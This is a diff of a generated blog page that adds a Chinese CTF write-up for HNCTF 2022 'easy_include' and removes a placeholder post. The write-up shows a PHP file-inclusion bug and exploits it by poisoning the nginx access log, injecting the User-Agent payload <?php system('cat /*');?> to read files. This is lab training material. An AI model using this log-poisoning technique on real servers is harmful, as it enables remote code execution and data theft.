@@ -69,6 +69,66 @@
       <div class="outer">
         <section id="main">
   
+    <article id="post-第三周2" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2025/01/29/%E7%AC%AC%E4%B8%89%E5%91%A82/" class="article-date">
+  <time class="dt-published" datetime="2025-01-29T10:30:14.000Z" itemprop="datePublished">2025-01-29</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="p-name article-title" href="/2025/01/29/%E7%AC%AC%E4%B8%89%E5%91%A82/">第三周2</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <p>题目： [HNCTF 2022 WEEK2]easy_include</p>
+<ol>
+<li><p>打开环境  直接就给php代码了<br>如下：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">  &lt;?php</span><br><span class="line">//WEB手要懂得搜索</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(isset(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">&quot;/php|flag|data|\~|\!|\@|\#|\\$|\%|\^|\&amp;|\*|\(|\)|\-|\_|\+|\=/i&quot;</span>, <span class="variable">$file</span>))&#123;</span><br><span class="line">        die(<span class="string">&quot;error&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    include(<span class="variable">$file</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>代码很简单  审计一下  发现  这要是用php伪协议来写  php，&#x3D;等<br>都被过滤了   这看来用不了php伪协议了</p>
+</li>
+<li><p>没办法了  我们看看这个&#x2F;文件的信息头<br>发现Server:nginx&#x2F;1.18.0</p>
+</li>
+<li><p>我们想到了 日志文件注入  去看看</p>
+</li>
+<li><p>我们打开burp抓包  由上面代码自动参数为file<br>我们payload：file&#x3D;&#x2F;var&#x2F;log&#x2F;nginx&#x2F;access.log<br>看一下  发现可以看到日志内容<br>并且日志内容：<br>39.162.187.117 - - [29&#x2F;Jan&#x2F;2025:10:31:17 +0000] “GET &#x2F; HTTP&#x2F;1.1” 200 1534 “-“ “Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;132.0.0.0 Safari&#x2F;537.36 Edg&#x2F;132.0.0.0”</p>
+</li>
+<li><p>发现内容都是User-Agent中的内容  Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64; rv:134.0) Gecko&#x2F;20100101 Firefox&#x2F;134.0<br>发现一样</p>
+</li>
+<li><p>我们对User-Agent中的信息注入 如下：</p>
+ <?php system('cat /*');?>
+<p> 发现了flag</p>
+</li>
+<li><p>总结：<br>不一定非要用php伪协议来进行文件包含<br>有些题目的过滤非常严格 把php等都过滤了</p>
+</li>
+</ol>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2025/01/29/%E7%AC%AC%E4%B8%89%E5%91%A82/" data-id="cm6hskbs800006guieplw91f2" data-title="第三周2" class="article-share-link"><span class="fa fa-share">Share</span></a>
+      
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+
+  
     <article id="post-第三周1" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
   <div class="article-meta">
     <a href="/2025/01/29/%E7%AC%AC%E4%B8%89%E5%91%A81/" class="article-date">
@@ -550,46 +610,6 @@ echo '~'.urlencode(~'0');
 
 
   
-    <article id="post-io" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
-  <div class="article-meta">
-    <a href="/2025/01/12/io/" class="article-date">
-  <time class="dt-published" datetime="2025-01-12T07:17:55.000Z" itemprop="datePublished">2025-01-12</time>
-</a>
-    
-  </div>
-  <div class="article-inner">
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="p-name article-title" href="/2025/01/12/io/">io</a>
-    </h1>
-  
-
-      </header>
-    
-    <div class="e-content article-entry" itemprop="articleBody">
-      
-        <img src="/2025/01/12/io/text.png" class="" title="图片引用方法一">
-<p>应该可以了不</p>
-
-      
-    </div>
-    <footer class="article-footer">
-      <a data-url="http://example.com/2025/01/12/io/" data-id="cm5ulxzzj00026gui15fi5ver" data-title="io" class="article-share-link"><span class="fa fa-share">Share</span></a>
-      
-      
-      
-    </footer>
-  </div>
-  
-</article>
-
-
-
-  
 
 
   <nav id="page-nav">
@@ -626,6 +646,10 @@ echo '~'.urlencode(~'0');
       <ul>
         
           <li>
+            <a href="/2025/01/29/%E7%AC%AC%E4%B8%89%E5%91%A82/">第三周2</a>
+          </li>
+        
+          <li>
             <a href="/2025/01/29/%E7%AC%AC%E4%B8%89%E5%91%A81/">第三周1</a>
           </li>
         
@@ -639,10 +663,6 @@ echo '~'.urlencode(~'0');
         
           <li>
             <a href="/2025/01/21/%E7%AC%AC%E4%BA%8C%E5%91%A81/">第二周1</a>
-          </li>
-        
-          <li>
-            <a href="/2025/01/13/%E7%AC%AC%E4%B8%80%E5%91%A83/">第一周3</a>
           </li>
         
       </ul>
